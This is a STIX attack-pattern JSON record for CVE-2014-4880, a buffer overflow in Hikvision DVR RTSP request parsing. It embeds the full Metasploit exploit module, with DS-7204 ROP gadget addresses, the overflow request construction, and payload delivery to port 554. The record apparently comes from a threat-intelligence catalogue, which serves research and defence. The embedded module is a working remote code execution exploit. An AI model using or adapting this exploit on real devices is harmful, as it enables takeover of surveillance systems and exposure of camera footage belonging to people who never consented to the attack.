{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1de49ddd-2bdb-4bd8-b953-e26c85b0aa19",
    "created": "2024-08-14T16:57:50.711217Z",
    "modified": "2024-08-14T16:57:50.711222Z",
    "name": "Hikvision DVR RTSP Request Remote Code Execution",
    "description": " This module exploits a buffer overflow in the RTSP request parsing code of Hikvision DVR appliances. The Hikvision DVR devices record video feeds of surveillance cameras and offer remote administration and playback of recorded footage.  The vulnerability is present in several models / firmware versions but due to the available test device this module only supports the DS-7204 model. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/hikvision_rtsp_bof.rb",
            "external_id": "hikvision_rtsp_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4880"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/11/19/r7-2014-18-hikvision-dvr-devices-multiple-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Hikvision DVR RTSP Request Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a buffer overflow in the RTSP request parsing\n        code of Hikvision DVR appliances. The Hikvision DVR devices record\n        video feeds of surveillance cameras and offer remote administration\n        and playback of recorded footage.\n\n        The vulnerability is present in several models / firmware versions\n        but due to the available test device this module only supports\n        the DS-7204 model.\n      },\n      'Author'         =>\n        [\n          'Mark Schloesser <mark_schloesser[at]rapid7.com>', # @repmovsb, vulnerability analysis & exploit dev\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2014-4880' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/11/19/r7-2014-18-hikvision-dvr-devices-multiple-vulnerabilities' ]\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_ARMLE,\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          #\n          # ROP targets are difficult to represent in the hash, use callbacks instead\n          #\n          [ \"DS-7204 Firmware V2.2.10 build 131009\", {\n\n            # The callback handles all target-specific settings\n            :callback => :target_ds7204_1,\n              'g_adjustesp' => 0x002c828c,\n              # ADD             SP, SP, #0x350\n              # LDMFD           SP!, {R4-R6,PC}\n\n              'g_r3fromsp'  => 0x00446f80,\n              # ADD             R3, SP, #0x60+var_58\n              # BLX             R6\n\n              'g_blxr3_pop' => 0x00456360,\n              # BLX             R3\n              # LDMFD           SP!, {R1-R7,PC}\n\n              'g_popr3'     => 0x0000fe98,\n              # LDMFD           SP!, {R3,PC}\n          } ],\n\n          [ \"Debug Target\", {\n\n            # The callback handles all target-specific settings\n            :callback => :target_debug\n\n          } ]\n\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-11-19'))\n\n    register_options(\n      [\n        Opt::RPORT(554)\n      ])\n  end\n\n  def exploit\n    unless self.respond_to?(target[:callback], true)\n      fail_with(Failure::NoTarget, \"Invalid target specified: no callback function defined\")\n    end\n\n    device_rop = self.send(target[:callback])\n\n    request =  \"PLAY rtsp://#{rhost}/ RTSP/1.0\\r\\n\"\n    request << \"CSeq: 7\\r\\n\"\n    request << \"Authorization: Basic \"\n    request << rand_text_alpha(0x280 + 34)\n    request << [target[\"g_adjustesp\"]].pack(\"V\")[0..2]\n    request << \"\\r\\n\\r\\n\"\n    request << rand_text_alpha(19)\n\n    # now append the ropchain\n    request << device_rop\n    request << rand_text_alpha(8)\n    request << payload.encoded\n\n    connect\n    sock.put(request)\n    disconnect\n  end\n\n  # These devices are armle, run version 1.3.1 of libupnp, have random stacks, but no PIE on libc\n  def target_ds7204_1\n    # Create a fixed-size buffer for the rop chain\n    ropbuf = rand_text_alpha(24)\n\n    # CHAIN = [\n    #   0, #R4 pop adjustsp\n    #   0, #R5 pop adjustsp\n    #   GADGET_BLXR3_POP, #R6 pop adjustsp\n    #   GADGET_POPR3,\n    #   0, #R3 pop\n    #   GADGET_R3FROMSP,\n    # ]\n\n    ropbuf[8,4] = [target[\"g_blxr3_pop\"]].pack(\"V\")\n    ropbuf[12,4] = [target[\"g_popr3\"]].pack(\"V\")\n    ropbuf[20,4] = [target[\"g_r3fromsp\"]].pack(\"V\")\n\n    return ropbuf\n  end\n\n  # Generate a buffer that provides a starting point for exploit development\n  def target_debug\n    Rex::Text.pattern_create(2000)\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-19",
    "x_mitre_platforms": [
        "linux'"
    ]
}